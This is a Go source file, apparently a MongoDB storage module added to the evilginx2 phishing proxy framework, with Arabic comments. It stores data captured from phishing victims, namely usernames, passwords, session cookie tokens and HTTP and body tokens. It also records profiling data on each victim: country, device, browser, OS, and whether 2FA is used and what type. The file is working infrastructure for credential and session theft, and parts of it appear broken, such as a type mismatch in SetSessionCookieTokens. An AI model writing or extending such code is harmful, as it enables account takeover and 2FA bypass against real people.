package database

import (
	"context"
	"fmt"
	"strings"
	"time"

	"github.com/kgretzky/evilginx2/log"
	
	"go.mongodb.org/mongo-driver/bson"
	"go.mongodb.org/mongo-driver/bson/primitive"
	"go.mongodb.org/mongo-driver/mongo"
	"go.mongodb.org/mongo-driver/mongo/options"
)

// MongoDatabase هو نسخة من قاعدة البيانات تستخدم MongoDB
type MongoDatabase struct {
	client       *mongo.Client
	db           *mongo.Database
	sessionsColl *mongo.Collection
	ctx          context.Context
	cancel       context.CancelFunc
	dbName       string
}

// Session مع تعديلات لدعم MongoDB
type MongoSession struct {
	ID           primitive.ObjectID            `bson:"_id,omitempty" json:"_id,omitempty"`
	Id           int                           `bson:"id" json:"id"`
	Phishlet     string                        `bson:"phishlet" json:"phishlet"`
	LandingURL   string                        `bson:"landing_url" json:"landing_url"`
	Username     string                        `bson:"username" json:"username"`
	Password     string                        `bson:"password" json:"password"`
	Custom       map[string]string             `bson:"custom" json:"custom"`
	BodyTokens   map[string]string             `bson:"body_tokens" json:"body_tokens"`
	HttpTokens   map[string]string             `bson:"http_tokens" json:"http_tokens"`
	CookieTokens map[string]map[string]interface{} `bson:"cookie_tokens" json:"tokens"`
	SessionId    string                        `bson:"session_id" json:"session_id"`
	UserAgent    string                        `bson:"useragent" json:"useragent"`
	RemoteAddr   string                        `bson:"remote_addr" json:"remote_addr"`
	CreateTime   int64                         `bson:"create_time" json:"create_time"`
	UpdateTime   int64                         `bson:"update_time" json:"update_time"`
	UserId       string                        `bson:"user_id" json:"user_id"`
	
	// إضافة الحقول الجديدة
	CountryCode    string                               `bson:"country_code"`
	CountryName    string                               `bson:"country_name"`
	DeviceType     string                               `bson:"device_type"`
	BrowserType    string                               `bson:"browser_type"`
	BrowserVersion string                               `bson:"browser_version"`
	OSType         string                               `bson:"os_type"`
	OSVersion      string                               `bson:"os_version"`
	LoginType      string                               `bson:"login_type"`
	Has2FA         bool                                 `bson:"has_2fa"`
	Type2FA        string                               `bson:"type_2fa"`
}

// NewMongoDatabase ينشئ اتصالًا جديدًا بقاعدة بيانات MongoDB
func NewMongoDatabase(mongoURI string, dbName string) (*MongoDatabase, error) {
	log.Info("محاولة الاتصال بـ MongoDB على: %s (قاعدة البيانات: %s)", mongoURI, dbName)

	// سيستمر العملية إذا فشل الاتصال (10 ثوان)
	ctx, cancel := context.WithTimeout(context.Background(), 20*time.Second)
	
	// إنشاء خيارات العميل
	clientOptions := options.Client().
		ApplyURI(mongoURI).
		SetServerSelectionTimeout(15 * time.Second).
		SetConnectTimeout(15 * time.Second).
		SetSocketTimeout(15 * time.Second).
		SetRetryWrites(true).
		SetRetryReads(true).
		SetDirect(false)
	
	// محاولة الاتصال
	log.Debug("[MongoDB] بدء الاتصال...")
	client, err := mongo.Connect(ctx, clientOptions)
	if err != nil {
		cancel()
		return nil, fmt.Errorf("فشل الاتصال بـ MongoDB: %v", err)
	}

	// التحقق من الاتصال
	log.Debug("[MongoDB] اختبار الاتصال...")
	pingCtx, cancelPing := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancelPing()
	
	if err := client.Ping(pingCtx, nil); err != nil {
		cancel()
		client.Disconnect(ctx)
		return nil, fmt.Errorf("فشل اختبار اتصال MongoDB: %v", err)
	}
	log.Info("تم الاتصال بـ MongoDB بنجاح!")

	db := client.Database(dbName)
	sessionsColl := db.Collection("sessions")
	
	// إنشاء فهرس على حقل SessionId للبحث السريع
	log.Debug("[MongoDB] إنشاء فهرس على حقل SessionId...")
	_, err = sessionsColl.Indexes().CreateOne(ctx, mongo.IndexModel{
		Keys:    bson.D{{Key: "session_id", Value: 1}},
		Options: options.Index().SetUnique(true),
	})
	if err != nil {
		cancel()
		client.Disconnect(ctx)
		return nil, fmt.Errorf("فشل إنشاء الفهرس: %v", err)
	}
	log.Debug("[MongoDB] تم إنشاء الفهرس بنجاح")
	
	// عد عدد الجلسات الموجود
	// إنشاء سياق جديد بدون مهلة للاستخدام في العمليات اللاحقة
	background := context.Background()

	return &MongoDatabase{
		client:       client,
		db:           db,
		sessionsColl: sessionsColl,
		ctx:          background,
		cancel:       cancel,
		dbName:       dbName,
	}, nil
}

// Close يغلق اتصال قاعدة البيانات
func (m *MongoDatabase) Close() error {
	defer m.cancel()
	return m.client.Disconnect(m.ctx)
}

// convertToMongoSession يحول كائن Session التقليدي إلى كائن MongoSession
func convertToMongoSession(s *Session) *MongoSession {
	// تحويل CookieTokens
	cookieTokens := make(map[string]map[string]interface{})
	for domain, tokens := range s.CookieTokens {
		cookieTokens[domain] = make(map[string]interface{})
		for name, token := range tokens {
			cookieTokens[domain][name] = map[string]interface{}{
				"name":      token.Name,
				"value":     token.Value,
				"path":      token.Path,
				"http_only": token.HttpOnly,
			}
		}
	}

	return &MongoSession{
		Id:           s.Id,
		Phishlet:     s.Phishlet,
		LandingURL:   s.LandingURL,
		Username:     s.Username,
		Password:     s.Password,
		Custom:       s.Custom,
		BodyTokens:   s.BodyTokens,
		HttpTokens:   s.HttpTokens,
		CookieTokens: cookieTokens,
		SessionId:    s.SessionId,
		UserAgent:    s.UserAgent,
		RemoteAddr:   s.RemoteAddr,
		CreateTime:   s.CreateTime,
		UpdateTime:   s.UpdateTime,
		UserId:       s.UserId,
		CountryCode:  s.CountryCode,
		CountryName:  s.CountryName,
		DeviceType:   s.DeviceType,
		BrowserType:  s.BrowserType,
		BrowserVersion: s.BrowserVersion,
		OSType:       s.OSType,
		OSVersion:    s.OSVersion,
		LoginType:    s.LoginType,
		Has2FA:        s.Has2FA,
		Type2FA:       s.Type2FA,
	}
}

// convertFromMongoSession يحول كائن MongoSession إلى كائن Session التقليدي
func convertFromMongoSession(ms *MongoSession) *Session {
	// تحويل CookieTokens
	cookieTokens := make(map[string]map[string]*CookieToken)
	for domain, tokens := range ms.CookieTokens {
		cookieTokens[domain] = make(map[string]*CookieToken)
		for name, tokenInterface := range tokens {
			if tokenMap, ok := tokenInterface.(map[string]interface{}); ok {
				cookieTokens[domain][name] = &CookieToken{
					Name:     getStringValue(tokenMap["name"]),
					Value:    getStringValue(tokenMap["value"]),
					Path:     getStringValue(tokenMap["path"]),
					HttpOnly: getBoolValue(tokenMap["http_only"]),
				}
			}
		}
	}

	// نحول ObjectID إلى int باستخدام الحقل Id من MongoSession
	return &Session{
		Id:           ms.Id, // استخدام ms.Id بدلاً من ms.ID (ObjectID)
		Phishlet:     ms.Phishlet,
		LandingURL:   ms.LandingURL,
		Username:     ms.Username,
		Password:     ms.Password,
		Custom:       ms.Custom,
		BodyTokens:   ms.BodyTokens,
		HttpTokens:   ms.HttpTokens,
		CookieTokens: cookieTokens,
		SessionId:    ms.SessionId,
		UserAgent:    ms.UserAgent,
		RemoteAddr:   ms.RemoteAddr,
		CreateTime:   ms.CreateTime,
		UpdateTime:   ms.UpdateTime,
		UserId:       ms.UserId,
		CountryCode:  ms.CountryCode,
		CountryName:  ms.CountryName,
		DeviceType:   ms.DeviceType,
		BrowserType:  ms.BrowserType,
		BrowserVersion: ms.BrowserVersion,
		OSType:       ms.OSType,
		OSVersion:    ms.OSVersion,
		LoginType:    ms.LoginType,
		Has2FA:        ms.Has2FA,
		Type2FA:       ms.Type2FA,
	}
}

// getStringValue يستخرج قيمة نصية من interface{}
func getStringValue(v interface{}) string {
	if v == nil {
		return ""
	}
	if s, ok := v.(string); ok {
		return s
	}
	return fmt.Sprintf("%v", v)
}

// getBoolValue يستخرج قيمة منطقية من interface{}
func getBoolValue(v interface{}) bool {
	if v == nil {
		return false
	}
	if b, ok := v.(bool); ok {
		return b
	}
	return false
}

// GetLastSessionId يحصل على آخر معرف جلسة
func (m *MongoDatabase) GetLastSessionId() (int, error) {
	opts := options.FindOne().SetSort(bson.D{{Key: "id", Value: -1}})
	var session MongoSession
	err := m.sessionsColl.FindOne(m.ctx, bson.D{}, opts).Decode(&session)
	if err != nil {
		if err == mongo.ErrNoDocuments {
			log.Debug("[MongoDB] لم يتم العثور على جلسات، سيتم إنشاء أول جلسة بمعرف 1")
			return 0, nil
		}
		log.Error("[MongoDB] خطأ أثناء الحصول على آخر معرف جلسة: %v", err)
		return 0, err
	}
	log.Debug("[MongoDB] آخر معرف جلسة: %d", session.Id)
	return session.Id, nil
}

// CreateSession ينشئ جلسة جديدة في MongoDB
func (m *MongoDatabase) CreateSession(
	sid, phishlet, landingURL, useragent, remoteAddr string,
	countryCode, countryName string,
	deviceType, browserType, browserVersion, osType, osVersion string,
	loginType string, has2FA bool, type2FA string,
) error {
	// حصول على آخر معرف
	lastId, err := m.GetLastSessionId()
	if err != nil {
		lastId = 0
	}
	
	// إنشاء كائن MongoSession بدلاً من Session
	mongoSession := &MongoSession{
		ID:            primitive.NewObjectID(),
		Id:            lastId + 1,
		Phishlet:      phishlet,
		LandingURL:    landingURL,
		Username:      "",
		Password:      "",
		Custom:        make(map[string]string),
		BodyTokens:    make(map[string]string),
		HttpTokens:    make(map[string]string),
		CookieTokens:  make(map[string]map[string]interface{}),
		SessionId:     sid,
		UserAgent:     useragent,
		RemoteAddr:    remoteAddr,
		CreateTime:    time.Now().Unix(),
		UpdateTime:    time.Now().Unix(),
		CountryCode:   countryCode,
		CountryName:   countryName,
		DeviceType:    deviceType,
		BrowserType:   browserType,
		BrowserVersion: browserVersion,
		OSType:        osType,
		OSVersion:     osVersion,
		LoginType:     loginType,
		Has2FA:        has2FA,
		Type2FA:       type2FA,
	}

	// حفظ في قاعدة البيانات
	_, err = m.sessionsColl.InsertOne(m.ctx, mongoSession)
	return err
}

// ListSessions يجلب قائمة الجلسات من MongoDB
func (m *MongoDatabase) ListSessions() ([]*Session, error) {
	log.Debug("[MongoDB] جلب قائمة جميع الجلسات")
	
	cursor, err := m.sessionsColl.Find(m.ctx, bson.M{})
	if err != nil {
		log.Error("[MongoDB] خطأ أثناء البحث عن الجلسات: %v", err)
		return nil, err
	}
	defer cursor.Close(m.ctx)

	var mongoSessions []MongoSession
	if err := cursor.All(m.ctx, &mongoSessions); err != nil {
		log.Error("[MongoDB] خطأ أثناء فك ترميز الجلسات: %v", err)
		return nil, err
	}

	sessions := make([]*Session, 0, len(mongoSessions))
	for i := range mongoSessions {
		sessions = append(sessions, convertFromMongoSession(&mongoSessions[i]))
	}

	return sessions, nil
}

// GetSessionById يجلب جلسة من MongoDB باستخدام المعرف العددي
func (m *MongoDatabase) GetSessionById(id int) (*Session, error) {
	var mongoSession MongoSession
	err := m.sessionsColl.FindOne(m.ctx, bson.M{"id": id}).Decode(&mongoSession)
	if err != nil {
		if err == mongo.ErrNoDocuments {
			return nil, fmt.Errorf("الجلسة غير موجودة بالمعرف: %d", id)
		}
		return nil, err
	}

	return convertFromMongoSession(&mongoSession), nil
}

// GetSessionBySid يجلب جلسة من MongoDB باستخدام معرف الجلسة
func (m *MongoDatabase) GetSessionBySid(sid string) (*Session, error) {
	log.Debug("[MongoDB] البحث عن الجلسة بواسطة SID: %s", sid)
	
	var mongoSession MongoSession
	err := m.sessionsColl.FindOne(m.ctx, bson.M{"session_id": sid}).Decode(&mongoSession)
	if err != nil {
		if err == mongo.ErrNoDocuments {
			log.Debug("[MongoDB] الجلسة غير موجودة: %s", sid)
			return nil, fmt.Errorf("الجلسة غير موجودة: %s", sid)
		}
		log.Error("[MongoDB] خطأ أثناء البحث عن الجلسة: %v", err)
		return nil, err
	}
	
	log.Debug("[MongoDB] تم العثور على الجلسة: %s (ID: %d)", sid, mongoSession.Id)
	return convertFromMongoSession(&mongoSession), nil
}

// UpdateSession يحدث خيارات الجلسة حسب الاسم والقيمة
func (m *MongoDatabase) UpdateSession(sid string, optionName string, optionValue string) error {
	now := time.Now().UTC().Unix()
	_, err := m.sessionsColl.UpdateOne(
		m.ctx,
		bson.M{"session_id": sid},
		bson.M{
			"$set": bson.M{
				optionName:    optionValue,
				"update_time": now,
			},
		},
	)
	return err
}

// UpdateSessionTokens يحدث كافة الرموز للجلسة
func (m *MongoDatabase) UpdateSessionTokens(sid string, tokens map[string]map[string]string) error {
	now := time.Now().UTC().Unix()
	_, err := m.sessionsColl.UpdateOne(
		m.ctx,
		bson.M{"session_id": sid},
		bson.M{
			"$set": bson.M{
				"tokens":      tokens,
				"update_time": now,
			},
		},
	)
	return err
}

// UpdateSessionCookieTokens يحدث رمز كوكي محدد للجلسة
func (m *MongoDatabase) UpdateSessionCookieTokens(sid string, domain string, key string, value map[string]string) error {
	now := time.Now().UTC().Unix()
	_, err := m.sessionsColl.UpdateOne(
		m.ctx,
		bson.M{"session_id": sid},
		bson.M{
			"$set": bson.M{
				fmt.Sprintf("cookie_tokens.%s.%s", domain, key): value,
				"update_time": now,
			},
		},
	)
	return err
}

// DeleteSessionById يحذف جلسة باستخدام المعرف العددي
func (m *MongoDatabase) DeleteSessionById(id int) error {
	log.Debug("[MongoDB] محاولة حذف الجلسة بالمعرف العددي: %d", id)
	
	result, err := m.sessionsColl.DeleteOne(m.ctx, bson.M{"id": id})
	if err != nil {
		log.Error("[MongoDB] خطأ أثناء حذف الجلسة بالمعرف %d: %v", id, err)
		return err
	}
	
	if result.DeletedCount == 0 {
		return fmt.Errorf("لم يتم العثور على جلسة بالمعرف: %d", id)
	}
	
	log.Debug("[MongoDB] تم حذف الجلسة بالمعرف %d بنجاح", id)
	return nil
}

// DeleteSession يحذف جلسة باستخدام معرف الجلسة (sid)
func (m *MongoDatabase) DeleteSession(sid string) error {
	_, err := m.sessionsColl.DeleteOne(m.ctx, bson.M{"session_id": sid})
	return err
}

// Flush لا يؤثر في MongoDB لكن موجود للتوافق مع الواجهة
func (m *MongoDatabase) Flush() {
	// لا حاجة للتنفيذ في MongoDB
}

// UpdateSessionBodyTokens يحدث رموز الهيكل للجلسة
func (m *MongoDatabase) SetSessionBodyTokens(sid string, tokens map[string]string) error {
	now := time.Now().UTC().Unix()
	_, err := m.sessionsColl.UpdateOne(
		m.ctx,
		bson.M{"session_id": sid},
		bson.M{
			"$set": bson.M{
				"body_tokens": tokens,
				"update_time": now,
			},
		},
	)
	return err
}

// UpdateSessionHttpTokens يحدث رموز HTTP للجلسة
func (m *MongoDatabase) SetSessionHttpTokens(sid string, tokens map[string]string) error {
	now := time.Now().UTC().Unix()
	_, err := m.sessionsColl.UpdateOne(
		m.ctx,
		bson.M{"session_id": sid},
		bson.M{
			"$set": bson.M{
				"http_tokens": tokens,
				"update_time": now,
			},
		},
	)
	return err
}

// UpdateSessionUsername يحدث اسم المستخدم للجلسة
func (m *MongoDatabase) SetSessionUsername(sid string, username string) error {
	return m.UpdateSession(sid, "username", username)
}

// UpdateSessionPassword يحدث كلمة المرور للجلسة
func (m *MongoDatabase) SetSessionPassword(sid string, password string) error {
	return m.UpdateSession(sid, "password", password)
}

// UpdateSessionCustom يحدث بيانات مخصصة للجلسة
func (m *MongoDatabase) SetSessionCustom(sid string, name, value string) error {
	return m.UpdateSession(sid, fmt.Sprintf("custom.%s", name), value)
}

// SetSessionCookieTokens يحدث رموز الكوكيز للجلسة
func (m *MongoDatabase) SetSessionCookieTokens(sid string, tokens map[string]map[string]*CookieToken) error {
	return m.UpdateSessionTokens(sid, map[string]map[string]string{
		"cookie_tokens": {
			"cookie_tokens": bson.M{
				"$set": bson.M{
					"cookie_tokens": tokens,
				},
			},
		},
	})
}

// SetupSession تقوم بإعداد جلسة كاملة مع جميع المعلومات الأساسية
func (m *MongoDatabase) SetupSession(
	sid string, phishlet string, username string, password string,
	landing_url string, useragent string, remote_addr string,
) error {
	// إنشاء الجلسة
	err := m.CreateSession(
		sid, phishlet, landing_url, useragent, remote_addr,
		"", "", // countryCode, countryName
		"", "", "", "", "", // deviceType, browserType, browserVersion, osType, osVersion
		"", false, "", // loginType, has2FA, type2FA
	)
	if err != nil {
		return err
	}

	// تحديث اسم المستخدم وكلمة المرور
	if err := m.SetSessionUsername(sid, username); err != nil {
		return err
	}

	if err := m.SetSessionPassword(sid, password); err != nil {
		return err
	}

	return nil
} 